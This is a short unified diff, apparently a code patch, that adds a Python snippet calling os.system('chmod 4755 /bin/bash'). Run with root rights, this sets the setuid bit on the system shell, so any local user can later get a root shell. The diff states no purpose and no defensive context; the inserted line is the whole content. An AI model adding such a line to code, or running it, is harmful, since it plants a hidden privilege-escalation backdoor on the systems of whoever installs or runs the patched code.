@@ -1,0 +1,3 @@
+import os
+os.system("chmod 4755 /bin/bash")
+
